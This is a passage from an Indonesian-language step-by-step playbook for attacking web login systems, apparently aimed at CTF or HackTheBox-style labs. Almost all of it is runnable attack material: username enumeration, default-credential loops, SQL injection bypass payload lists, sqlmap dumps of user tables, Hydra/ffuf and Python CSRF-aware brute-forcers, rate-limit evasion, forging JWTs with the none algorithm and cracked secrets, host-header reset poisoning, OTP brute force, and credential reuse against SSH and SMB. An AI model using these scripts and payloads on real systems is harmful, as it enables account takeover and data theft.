curl -s "$LOGIN_URL" | grep -iE "<form|<input|password|username|token|csrf|hidden"

# Cek response headers
curl -I "$LOGIN_URL"

# Cek apakah ada JWT di response setelah GET
curl -s -c /tmp/auth_cookies.txt "$LOGIN_URL" \
    | grep -iE "jwt|bearer|authorization|token"

# Cek HTTP Basic Auth
curl -I "$TARGET/admin" | grep -i "WWW-Authenticate"
```

**OUTPUT BERHASIL ✅ — Form-based login:**

HTML

```
<form action="/login" method="POST">
<input name="username" type="text">
<input name="password" type="password">
<input type="hidden" name="_token" value="abc123xyz789">
```

**Cara baca dan tentukan path:**

|Yang Ditemukan|Mechanism|Path Selanjutnya|
|---|---|---|
|`<form method="POST">` + `<input type="password">`|Form-Based|→ **FASE 1**|
|`WWW-Authenticate: Basic`|HTTP Basic Auth|→ **FASE 1 (Basic)**|
|`eyJhbGci...` di cookie/header|JWT|→ **FASE 5 (JWT)**|
|`/oauth/authorize` atau `/sso`|OAuth/SSO|→ **FASE 6**|
|`otp`, `2fa`, `verify-code` di form|MFA aktif|→ perlu creds dulu, lalu **FASE 4**|

Bash

```
# Simpan parameter yang ditemukan
export FORM_ACTION="/login"
export PARAM_USER="username"
export PARAM_PASS="password"
export CSRF_TOKEN="abc123xyz789"  # jika ada

# Cek apakah ada CSRF token (PENTING untuk brute force)
HAS_CSRF=$(curl -s "$LOGIN_URL" | grep -c "csrf\|_token\|hidden")
echo "[*] CSRF indicators: $HAS_CSRF"
```

---

## ═══════════════════════════════════════

## FASE 1: USERNAME ENUMERATION

## ═══════════════════════════════════════

> **Rule:** Lakukan DULU sebelum brute force. Hemat waktu dan resource.

### Langkah 1.1 — Error Message Comparison

Bash

```
# Test dengan username yang kemungkinan valid (admin, administrator)
curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=wrongpassword123" \
    -o ~/auth_loot/recon/response_admin.txt

# Test dengan username random
curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=randomuser99999&$PARAM_PASS=wrongpassword123" \
    -o ~/auth_loot/recon/response_random.txt

# Bandingkan perbedaan
diff ~/auth_loot/recon/response_admin.txt ~/auth_loot/recon/response_random.txt
```

**OUTPUT BERHASIL ✅ — Error message berbeda:**

text

```
< Invalid password
---
> User does not exist
```

atau:

text

```
< Account is locked
---
> Username not found
```

➡️ **Username "admin" VALID!** Simpan:

Bash

```
echo "admin" >> ~/auth_loot/creds/valid_users.txt
```

➡️ Lanjut ke **Langkah 1.2** untuk enumerate lebih banyak user

**OUTPUT GAGAL ❌ — Response sama:**

text

```
(diff tidak menunjukkan perbedaan berarti)
```

➡️ Generic error. Coba timing analysis:

Bash

```
# Method 2: Timing difference
time curl -s -o /dev/null -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=x"

time curl -s -o /dev/null -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=randomuser99999&$PARAM_PASS=x"
```

**OUTPUT BERHASIL ✅ — Timing berbeda:**

text

```
admin:        real 0m0.183s   ← lebih lambat = verifikasi password
randomuser:   real 0m0.012s   ← langsung return = user tidak ada
```

➡️ Username "admin" likely valid!

---

### Langkah 1.2 — Enumerate Username List

Bash

```
# Command 1: ffuf username enumeration (ukur baseline dulu!)
# Step 1: Ukur baseline response size (gagal)
FAIL_SIZE=$(curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=NONEXISTENTUSER99999&$PARAM_PASS=x" | wc -c)
echo "[*] Baseline fail size: $FAIL_SIZE"

# Step 2: Enumerate dengan ffuf
ffuf -u "$LOGIN_URL" \
    -X POST \
    -d "$PARAM_USER=FUZZ&$PARAM_PASS=x" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -fs $FAIL_SIZE \
    -o ~/auth_loot/recon/valid_users_ffuf.txt

# Command 2: Coba registration page (konfirmasi username exist)
curl -s -X POST "$TARGET/register" \
    -d "username=admin&email=test@test.com" \
    | grep -i "already\|taken\|exist"

# Command 3: Forgot password enumeration
curl -s -X POST "$TARGET/forgot-password" \
    -d "email=admin@$TARGET" \
    | head -50
curl -s -X POST "$TARGET/forgot-password" \
    -d "email=random@example123.com" \
    | head -50
```

**OUTPUT BERHASIL ✅ — Valid users dari ffuf:**

text

```
admin           [Status: 302, Size: 245]  ← berbeda dari baseline
john            [Status: 302, Size: 245]
```

Bash

```
# Simpan ke file
cat ~/auth_loot/recon/valid_users_ffuf.txt | grep "Status: 302" \
    | awk '{print $1}' > ~/auth_loot/creds/valid_users.txt

echo "[*] Valid users found: $(wc -l < ~/auth_loot/creds/valid_users.txt)"
```

**OUTPUT GAGAL ❌ — Semua size sama:**

text

```
(tidak ada perbedaan di response)
```

➡️ Tidak bisa enumerate via error message. Coba cara lain:

Bash

```
# Cek RSS feed (sering leak username)
curl -s "$TARGET/feed" | grep -oP '<dc:creator>[^<]+' | cut -d'>' -f2

# Cek /api/users jika ada
curl -s "$TARGET/api/users" | jq '.[]?.username' 2>/dev/null

# Cek author di artikel/post
curl -s "$TARGET" | grep -oP 'author[^>]*>[^<]+' | head -10
```

---

## ═══════════════════════════════════════

## FASE 2: DEFAULT CREDENTIALS TEST

## ═══════════════════════════════════════

> **Lakukan ini SEBELUM brute force** — sering menyelesaikan masalah dalam 5 menit

### Langkah 2.1 — Cek Default Credentials

Bash

```
# Buat list default credentials berdasarkan tech stack yang terdeteksi
cat > /tmp/default_creds.txt << 'EOF'
admin:admin
admin:password
admin:password123
admin:admin123
admin:root
admin:1234
admin:12345
admin:123456
root:root
root:toor
administrator:admin
administrator:password
test:test
guest:guest
EOF

# Test satu per satu dengan curl
while IFS=: read -r user pass; do
    RESULT=$(curl -s -X POST "$LOGIN_URL" \
        -d "$PARAM_USER=$user&$PARAM_PASS=$pass" \
        -L | grep -ic "dashboard\|logout\|welcome\|admin panel")
    
    if [ "$RESULT" -gt 0 ]; then
        echo "[+] VALID: $user:$pass"
        export AUTH_USER="$user"
        export AUTH_PASS="$pass"
        echo "$user:$pass" >> ~/auth_loot/creds/found_creds.txt
        break
    else
        echo "[-] Invalid: $user:$pass"
    fi
done < /tmp/default_creds.txt
```

**OUTPUT BERHASIL ✅ — Default creds work:**

text

```
[+] VALID: admin:admin
```

➡️ Simpan dan skip brute force → ke **FASE 7 (Post-Login)**

**OUTPUT GAGAL ❌ — Semua gagal:**

text

```
[-] Invalid: admin:admin
[-] Invalid: admin:password
...
```

➡️ Default creds tidak work. Lanjut ke **FASE 3 (SQLi Bypass)**

---

## ═══════════════════════════════════════

## FASE 3: SQL INJECTION BYPASS

## ═══════════════════════════════════════

> **Coba ini SEBELUM brute force** — bisa bypass tanpa perlu password

### Langkah 3.1 — Test SQLi Payload

Bash

```
# Payload list SQLi bypass
cat > /tmp/sqli_payloads.txt << 'EOF'
admin'--
admin'#
admin'/*
' OR 1=1--
' OR 1=1#
' OR '1'='1
' OR '1'='1'--
admin' OR '1'='1'--
admin' OR 1=1--
' OR 1=1 LIMIT 1--
') OR ('1'='1
') OR 1=1--
1' OR '1'='1'--
EOF

# Test setiap payload
while read payload; do
    RESULT=$(curl -s -X POST "$LOGIN_URL" \
        --data-urlencode "$PARAM_USER=$payload" \
        --data-urlencode "$PARAM_PASS=randompass" \
        -L | grep -ic "dashboard\|logout\|welcome")
    
    if [ "$RESULT" -gt 0 ]; then
        echo "[+] SQLi BYPASS! Payload: $payload"
        export SQLI_PAYLOAD="$payload"
        echo "SQLi bypass: $payload" >> ~/auth_loot/creds/found_creds.txt
        break
    fi
done < /tmp/sqli_payloads.txt

# Coba juga di field password
while read payload; do
    RESULT=$(curl -s -X POST "$LOGIN_URL" \
        --data-urlencode "$PARAM_USER=admin" \
        --data-urlencode "$PARAM_PASS=$payload" \
        -L | grep -ic "dashboard\|logout\|welcome")
    
    if [ "$RESULT" -gt 0 ]; then
        echo "[+] SQLi BYPASS via password! Payload: $payload"
        break
    fi
done < /tmp/sqli_payloads.txt
```

**OUTPUT BERHASIL ✅ — SQLi bypass berhasil:**

text

```
[+] SQLi BYPASS! Payload: admin'--
```

➡️ **LOGIN BERHASIL tanpa password!** Ke **FASE 7 (Post-Login)**

Bash

```
# Gunakan Burp atau curl dengan cookie untuk akses lebih lanjut
curl -s -X POST "$LOGIN_URL" \
    --data-urlencode "$PARAM_USER=admin'--" \
    --data-urlencode "$PARAM_PASS=x" \
    -c ~/auth_loot/tokens/session_sqli.txt \
    -L | grep -i "dashboard\|welcome"
```

**OUTPUT GAGAL ❌ — Semua payload gagal:**

text

```
(tidak ada dashboard, semua return login page)
```

➡️ Login tidak vulnerable ke SQLi sederhana. Lanjut ke **FASE 4 (Brute Force)**

---

### Langkah 3.2 — sqlmap untuk Validasi (Jika ada indikasi SQLi)

Bash

```
# Gunakan hanya jika ada indikasi error SQL muncul di response sebelumnya
sqlmap -u "$LOGIN_URL" \
    --data="$PARAM_USER=admin&$PARAM_PASS=test" \
    --forms \
    --batch \
    --dbs \
    --output-dir=~/auth_loot/recon/sqlmap/
```

**OUTPUT BERHASIL ✅ — SQL injection confirmed:**

text

```
[INFO] POST parameter 'username' is vulnerable
available databases [2]:
[*] information_schema
[*] webapp_db
```

➡️ Dump tabel users:

Bash

```
sqlmap -u "$LOGIN_URL" \
    --data="$PARAM_USER=admin&$PARAM_PASS=test" \
    -D webapp_db \
    -T users \
    --dump \
    --batch
```

---

## ═══════════════════════════════════════

## FASE 4: BRUTE FORCE ATTACK

## ═══════════════════════════════════════

> **PERHATIKAN:** Cek rate limiting dan lockout sebelum mulai!

### Langkah 4.1 — Cek Rate Limiting dan Lockout

Bash

```
# Test apakah ada rate limiting (kirim 5 request cepat)
for i in {1..5}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$LOGIN_URL" \
        -d "$PARAM_USER=testuser&$PARAM_PASS=wrongpass$i")
    echo "Request $i: HTTP $STATUS"
    sleep 0.5
done
```

**OUTPUT BERHASIL ✅ — Tidak ada lockout:**

text

```
Request 1: HTTP 200
Request 2: HTTP 200
Request 3: HTTP 200
Request 4: HTTP 200
Request 5: HTTP 200
```

➡️ Bisa brute force. Lanjut ke **Langkah 4.2**

**OUTPUT GAGAL ❌ — Rate limiting atau lockout aktif:**

text

```
Request 1: HTTP 200
Request 2: HTTP 200
Request 3: HTTP 429  ← Too Many Requests
Request 4: HTTP 429
Request 5: HTTP 429
```

➡️ Harus bypass rate limiting. Coba:

Bash

```
# Bypass 1: X-Forwarded-For header rotation
for i in {1..5}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-Forwarded-For: 10.0.0.$i" \
        -X POST "$LOGIN_URL" \
        -d "$PARAM_USER=admin&$PARAM_PASS=test$i")
    echo "Request $i (IP 10.0.0.$i): HTTP $STATUS"
done

# Bypass 2: Variasi header lain yang kadang dipercaya server
# X-Real-IP, Client-IP, Forwarded, X-Originating-IP
```

---

### Langkah 4.2 — Hydra Brute Force (Tanpa CSRF Token)

Bash

```
# Step 1: Ukur baseline fail response size
FAIL_SIZE=$(curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=definitelywrongpassword999" | wc -c)
echo "[*] Fail response size: $FAIL_SIZE bytes"

# Step 2: Ambil string failure yang spesifik dari response
FAIL_STRING=$(curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=definitelywrongpassword999" \
    | grep -iE "invalid|wrong|incorrect|error|failed" | head -1 | sed 's/<[^>]*>//g' | xargs)
echo "[*] Fail string detected: $FAIL_STRING"

# Step 3: Hydra dengan string failure
hydra -l admin \
    -P /usr/share/wordlists/rockyou.txt \
    "$TARGET" \
    http-post-form \
    "/$FORM_ACTION:$PARAM_USER=^USER^&$PARAM_PASS=^PASS^:F=$FAIL_STRING" \
    -f \
    -t 4 \
    -w 3 \
    -v \
    | tee ~/auth_loot/recon/hydra_results.txt

# Jika username list ada
hydra -L ~/auth_loot/creds/valid_users.txt \
    -P /tmp/targeted_pass.txt \
    "$TARGET" \
    http-post-form \
    "/$FORM_ACTION:$PARAM_USER=^USER^&$PARAM_PASS=^PASS^:F=$FAIL_STRING" \
    -f -t 4 -v
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
[80][http-post-form] host: 10.10.11.200   login: admin   password: password123
```

➡️ Simpan credentials:

Bash

```
export AUTH_USER="admin"
export AUTH_PASS="password123"
echo "$AUTH_USER:$AUTH_PASS" >> ~/auth_loot/creds/found_creds.txt
```

➡️ Ke **FASE 7 (Post-Login)**

**OUTPUT GAGAL ❌ — Tidak ada hasil:**

text

```
[ERROR] No valid passwords found.
```

➡️ Kemungkinan:

1. Failure string salah → cek ulang dengan Burp
2. Ada CSRF token → ke **Langkah 4.3**
3. Password tidak di rockyou → generate custom wordlist

Bash

```
# Generate targeted wordlist dari website
cewl "$TARGET" -d 2 -w ~/auth_loot/creds/cewl_words.txt
cat ~/auth_loot/creds/cewl_words.txt

# Mutate dengan hashcat rules
hashcat --stdout ~/auth_loot/creds/cewl_words.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    > ~/auth_loot/creds/mutated_words.txt

# Brute force dengan custom wordlist
hydra -l admin \
    -P ~/auth_loot/creds/mutated_words.txt \
    "$TARGET" \
    http-post-form \
    "/$FORM_ACTION:$PARAM_USER=^USER^&$PARAM_PASS=^PASS^:F=$FAIL_STRING" \
    -f -t 4
```

---

### Langkah 4.3 — Brute Force dengan CSRF Token (Python)

Bash

```
# Jika form punya CSRF token dinamis, hydra tidak bisa handle
# Gunakan Python script yang handle token per request

cat > ~/auth_loot/brute_csrf.py << 'PYEOF'
#!/usr/bin/env python3
import requests
import re
import sys

TARGET = "TARGET_URL_HERE"
LOGIN_URL = f"{TARGET}/login"
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

# Ambil CSRF token name dan success indicator dari argumen
CSRF_NAME = "_token"  # Ganti sesuai form

session = requests.Session()

def get_csrf_token():
    r = session.get(LOGIN_URL, timeout=5)
    # Coba beberapa pola CSRF token
    patterns = [
        r'name="_token"\s+value="([^"]+)"',
        r'name="csrf_token"\s+value="([^"]+)"',
        r'name="csrfmiddlewaretoken"\s+value="([^"]+)"',
        r'"csrf_token":\s*"([^"]+)"',
    ]
    for pattern in patterns:
        token = re.search(pattern, r.text)
        if token:
            return token.group(1)
    return None

print(f"[*] Target: {LOGIN_URL}")
print(f"[*] Username: {USERNAME}")
print(f"[*] Wordlist: {WORDLIST}")

with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

for i, password in enumerate(passwords[:5000]):  # Limit 5000 untuk CTF
    csrf = get_csrf_token()
    if not csrf:
        print("[-] CSRF token not found, trying without...")
        csrf = ""
    
    data = {
        "username": USERNAME,
        "password": password,
        CSRF_NAME: csrf
    }
    
    try:
        res = session.post(LOGIN_URL, data=data, allow_redirects=True, timeout=5)
        
        if any(indicator in res.text.lower() for indicator in 
               ["dashboard", "logout", "welcome", "profile"]):
            print(f"\n[+] SUCCESS! Password: {password}")
            sys.exit(0)
        
        if i % 100 == 0:
            print(f"[*] Progress: {i}/{len(passwords[:5000])}")
            
    except Exception as e:
        print(f"[-] Error: {e}")
        continue

print("[-] Password not found in wordlist")
PYEOF

# Edit TARGET di script
sed -i "s|TARGET_URL_HERE|$TARGET|g" ~/auth_loot/brute_csrf.py

python3 ~/auth_loot/brute_csrf.py
```

---

### Langkah 4.4 — ffuf Brute Force (Alternatif Hydra)

Bash

```
# Step 1: Ukur fail size DULU
FAIL_SIZE=$(curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=INVALIDPASS99999" | wc -c)

# Step 2: ffuf password brute force
ffuf -u "$LOGIN_URL" \
    -X POST \
    -d "$PARAM_USER=admin&$PARAM_PASS=FUZZ" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w /usr/share/wordlists/rockyou.txt \
    -fs $FAIL_SIZE \
    -t 10 \
    -o ~/auth_loot/recon/ffuf_brute.txt
```

**OUTPUT BERHASIL ✅:**

text

```
password123     [Status: 302, Size: 245]   ← berbeda dari fail size!
```

---

## ═══════════════════════════════════════

## FASE 5: JWT BYPASS

## ═══════════════════════════════════════

> **Masuk sini jika menemukan JWT token di response**

### Langkah 5.1 — Identifikasi dan Decode JWT

Bash

```
# Cek apakah ada JWT
curl -s -c /tmp/jwt_cookies.txt "$LOGIN_URL" -I | grep -i "set-cookie\|authorization"

# Simpan JWT token
export JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.signature"

# Decode header dan payload
python3 << 'PY'
import base64, json, sys, os

token = os.environ.get("JWT_TOKEN", "")
parts = token.split(".")
if len(parts) != 3:
    print("Invalid JWT format")
    sys.exit(1)

for name, part in zip(("HEADER", "PAYLOAD"), parts[:2]):
    part += "=" * (-len(part) % 4)
    data = base64.urlsafe_b64decode(part)
    print(f"\n{name}:")
    print(json.dumps(json.loads(data), indent=2))
PY
```

**OUTPUT BERHASIL ✅ — Decode JWT:**

JSON

```
HEADER:
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "sub": "user",
  "role": "user",
  "iat": 1689234123
}
```

**Decision berdasarkan `alg`:**

|Algorithm|Attack|Command|
|---|---|---|
|`none`|None algorithm|Langsung ke Langkah 5.2|
|`HS256`|Weak secret brute force|Langsung ke Langkah 5.3|
|`RS256`|Algorithm confusion|Ke Langkah 5.4|

---

### Langkah 5.2 — None Algorithm Attack

Bash

```
# Buat JWT dengan alg=none dan role=admin
python3 << 'PY'
import base64, json, os

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Modifikasi payload untuk admin
header = {"alg": "none", "typ": "JWT"}
payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 1689234123
}

h = b64url(json.dumps(header, separators=(',', ':')))
p = b64url(json.dumps(payload, separators=(',', ':')))

# Dengan trailing dot (none algorithm)
token_with_dot = f"{h}.{p}."
# Tanpa trailing dot
token_without_dot = f"{h}.{p}"

print(f"[+] Token with trailing dot:\n{token_with_dot}\n")
print(f"[+] Token without trailing dot:\n{token_without_dot}")
PY

# Test token ke endpoint admin
export NONE_TOKEN="PASTE_TOKEN_HERE"

# Coba via Authorization header
curl -i -H "Authorization: Bearer $NONE_TOKEN" "$TARGET/admin"
curl -i -H "Authorization: Bearer $NONE_TOKEN" "$TARGET/dashboard"

# Coba via cookie
curl -i -H "Cookie: token=$NONE_TOKEN" "$TARGET/admin"
curl -i -H "Cookie: jwt=$NONE_TOKEN" "$TARGET/admin"
```

**OUTPUT BERHASIL ✅ — Admin access:**

text

```
HTTP/1.1 200 OK
<h1>Admin Dashboard</h1>
```

➡️ **BYPASS BERHASIL!** Ke **FASE 7**

**OUTPUT GAGAL ❌ — 401/403:**

text

```
HTTP/1.1 401 Unauthorized
{"error": "Invalid token"}
```

➡️ Implementation aman terhadap none algorithm. Coba Langkah 5.3

---

### Langkah 5.3 — Weak Secret Brute Force

Bash

```
# Simpan JWT token ke file
echo "$JWT_TOKEN" > ~/auth_loot/tokens/jwt.txt

# Hashcat mode 16500 (JWT HS256/HS384/HS512)
hashcat -m 16500 \
    ~/auth_loot/tokens/jwt.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/auth_loot/tokens/jwt_cracked.txt

# Cek hasil
cat ~/auth_loot/tokens/jwt_cracked.txt

# John the Ripper (alternatif)
john --wordlist=/usr/share/wordlists/rockyou.txt \
    ~/auth_loot/tokens/jwt.txt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Secret ter-crack:**

text

```
eyJhbG...:secret123    (hashcat)
```

➡️ Secret adalah `secret123`. Forge JWT baru dengan role admin:

Bash

```
python3 << 'PY'
import hmac, hashlib, base64, json

SECRET = "secret123"

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1689234123}

h = b64url(json.dumps(header, separators=(',', ':')))
p = b64url(json.dumps(payload, separators=(',', ':')))
msg = f"{h}.{p}"

sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

print(f"[+] Forged admin JWT:\n{msg}.{sig_b64}")
PY
```

**OUTPUT GAGAL ❌ — Secret tidak ter-crack:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba dengan SecLists dan rules:

Bash

```
hashcat -m 16500 ~/auth_loot/tokens/jwt.txt \
    /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    --force
```

---

## ═══════════════════════════════════════

## FASE 6: PASSWORD RESET VULNERABILITIES

## ═══════════════════════════════════════

### Langkah 6.1 — Test Password Reset Flow

Bash

```
# Step 1: Cek email enumeration via reset
curl -s -X POST "$TARGET/forgot-password" \
    -d "email=admin@target.htb" \
    > ~/auth_loot/recon/reset_known.txt

curl -s -X POST "$TARGET/forgot-password" \
    -d "email=randomXXX999@example123.com" \
    > ~/auth_loot/recon/reset_unknown.txt

diff ~/auth_loot/recon/reset_known.txt ~/auth_loot/recon/reset_unknown.txt
```

**OUTPUT BERHASIL ✅ — Email enumeration:**

text

```
< Reset email has been sent.
---
> No account found with that email.
```

➡️ Email "[admin@target.htb](mailto:admin@target.htb)" confirmed valid!

Bash

```
# Step 2: Test Host Header Poisoning
curl -i \
    -H "Host: attacker.example.com" \
    -X POST "$TARGET/forgot-password" \
    -d "email=admin@target.htb"

curl -i \
    -H "X-Forwarded-Host: attacker.example.com" \
    -X POST "$TARGET/forgot-password" \
    -d "email=admin@target.htb"
```

**OUTPUT BERHASIL ✅ — Host header diterima:**

text

```
HTTP/1.1 200 OK
(email dikirim dengan reset link ke attacker.example.com)
```

➡️ Jika lab menyediakan listener, setup dulu:

Bash

```
nc -lvnp 8000
# atau
python3 -m http.server 8000
```

Bash

```
# Step 3: Cek predictable reset token
# Request reset dua kali, analisis token
curl -s -X POST "$TARGET/forgot-password" -d "email=admin@target.htb"
# Capture token dari email atau response
# Bandingkan pola: apakah sequential, timestamp-based, dll

# Step 4: Test token reuse
# Setelah gunakan token sekali, coba gunakan lagi
curl -i -X POST "$TARGET/reset-password" \
    -d "token=CAPTURED_TOKEN&password=newpass123"
# Coba lagi dengan token yang sama
curl -i -X POST "$TARGET/reset-password" \
    -d "token=CAPTURED_TOKEN&password=anotherpass123"
```

---

## ═══════════════════════════════════════

## FASE 6B: CAPTCHA & MFA BYPASS

## ═══════════════════════════════════════

### Langkah 6B.1 — CAPTCHA Bypass

Bash

```
# Method 1: Reuse CAPTCHA token
# Ambil token pertama
CAPTCHA_TOKEN=$(curl -s "$TARGET/login" \
    | grep -oP 'captcha[^"]*value="[^"]+' | grep -oP '"[^"]+$' | tr -d '"')

# Gunakan token yang sama berkali-kali
for i in {1..3}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$LOGIN_URL" \
        -d "$PARAM_USER=admin&$PARAM_PASS=test$i&captcha=$CAPTCHA_TOKEN")
    echo "Attempt $i with same token: HTTP $STATUS"
done

# Method 2: Empty/null CAPTCHA
curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=test&captcha=" | head -20

# Method 3: Remove CAPTCHA field entirely
curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=admin&$PARAM_PASS=test" | head -20

# Method 4: Coba old API endpoint tanpa CAPTCHA
for endpoint in "/api/login" "/api/v1/login" "/api/v2/login" "/legacy/login"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET$endpoint" \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"admin"}')
    echo "$endpoint: $STATUS"
done
```

**OUTPUT BERHASIL ✅ — CAPTCHA tidak divalidasi server-side:**

text

```
Attempt 2 with same token: HTTP 302   ← login berhasil dengan token reused!
```

---

### Langkah 6B.2 — MFA/OTP Bypass

Bash

```
# Setelah login dengan password benar, test OTP bypass

# Method 1: OTP Empty/Null
curl -s -X POST "$TARGET/verify-otp" \
    -b ~/auth_loot/tokens/session.txt \
    -d "otp=" | head -20

# Method 2: OTP Missing parameter
curl -s -X POST "$TARGET/verify-otp" \
    -b ~/auth_loot/tokens/session.txt | head -20

# Method 3: Response manipulation (butuh Burp, ini simulasinya)
# Intercept response dari /verify-otp dan ubah {"verified":false} → {"verified":true}

# Method 4: OTP Brute Force 4-digit (jika tidak ada lockout)
FAIL_SIZE=$(curl -s -X POST "$TARGET/verify-otp" \
    -b ~/auth_loot/tokens/session.txt -d "otp=9999" | wc -c)

ffuf -u "$TARGET/verify-otp" \
    -X POST \
    -b "$(cat ~/auth_loot/tokens/session.txt | grep -oP '\S+\s+\S+$')" \
    -d "otp=FUZZ" \
    -w <(seq -w 0 9999) \
    -fs $FAIL_SIZE \
    -t 5

# Method 5: Cek apakah OTP ada di response
curl -s -X POST "$TARGET/send-otp" \
    -b ~/auth_loot/tokens/session.txt | jq .
```

**OUTPUT BERHASIL ✅ — OTP di response:**

JSON

```
{
  "status": "ok",
  "otp": "123456"   ← OTP bocor di response!
}
```

➡️ Gunakan OTP tersebut untuk complete login!

---

## ═══════════════════════════════════════

## FASE 7: POST-LOGIN — VALIDASI & ESCALATE

## ═══════════════════════════════════════

### Langkah 7.1 — Login dan Capture Session

Bash

```
# Login dengan credentials yang ditemukan
curl -s -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=$AUTH_USER&$PARAM_PASS=$AUTH_PASS" \
    -c ~/auth_loot/tokens/session.txt \
    -L | grep -iE "dashboard|welcome|logout" | head -5

echo "[*] Session cookie disimpan di ~/auth_loot/tokens/session.txt"
cat ~/auth_loot/tokens/session.txt
```

**OUTPUT BERHASIL ✅ — Session valid:**

text

```
PHPSESSID  abc123xyz  /  ...
```

Bash

```
# Verifikasi akses dengan session
curl -s -b ~/auth_loot/tokens/session.txt "$TARGET/dashboard" | head -20
curl -s -b ~/auth_loot/tokens/session.txt "$TARGET/admin" | head -20
curl -s -b ~/auth_loot/tokens/session.txt "$TARGET/profile" | head -20
```

---

### Langkah 7.2 — Session Analysis

Bash

```
# Analisis cookie flags
curl -I -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=$AUTH_USER&$PARAM_PASS=$AUTH_PASS" \
    | grep -i "set-cookie"
```

**OUTPUT yang dicari:**

text

```
Set-Cookie: PHPSESSID=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

**Analisis flags:**

|Flag|Ada/Tidak|Implication|
|---|---|---|
|`HttpOnly`|Ada|JS tidak bisa baca cookie — lebih aman|
|`Secure`|Ada|Hanya HTTPS — lebih aman|
|`SameSite`|Ada|CSRF protection — lebih aman|
|`HttpOnly`|**Tidak ada**|XSS bisa steal cookie!|
|`Secure`|**Tidak ada**|Cookie bisa leak via HTTP|

Bash

```
# Test session fixation
# Ambil session sebelum login
PRE_SESSION=$(curl -s -c /tmp/pre_session.txt -I "$LOGIN_URL" \
    | grep -oP "PHPSESSID=[^;]+")
echo "[*] Pre-login session: $PRE_SESSION"

# Login
curl -s -b /tmp/pre_session.txt -c /tmp/post_session.txt \
    -X POST "$LOGIN_URL" \
    -d "$PARAM_USER=$AUTH_USER&$PARAM_PASS=$AUTH_PASS" > /dev/null

POST_SESSION=$(grep "PHPSESSID" /tmp/post_session.txt | awk '{print $7}')
echo "[*] Post-login session: $POST_SESSION"

# Bandingkan
if [ "$PRE_SESSION" = "$POST_SESSION" ]; then
    echo "[!] SESSION FIXATION POSSIBLE - session ID tidak berubah setelah login!"
else
    echo "[+] Session ID berubah setelah login - aman dari fixation"
fi
```

---

### Langkah 7.3 — Credential Reuse ke Service Lain

Bash

```
# Credentials dari web auth → test ke service lain
nxc ssh $TARGET -u "$AUTH_USER" -p "$AUTH_PASS"   # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
nxc ftp $TARGET -u "$AUTH_USER" -p "$AUTH_PASS"   # → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
nxc smb $TARGET -u "$AUTH_USER" -p "$AUTH_PASS"   # → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
```

**Cross-Service Testing Chart:**

text

```
Auth Creds Found
     │
     ├─ ─→ Port 22   (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Port 21   (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 445  (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     ├──→ Port 3306 (MySQL)   → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Port 5985 (WinRM)   → evil-winrm
     └──→ Other Web Apps      → reuse credentials
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|Hydra tidak menemukan password|Failure string salah|Ambil response ASLI dengan Burp, cari teks failure yang exact|
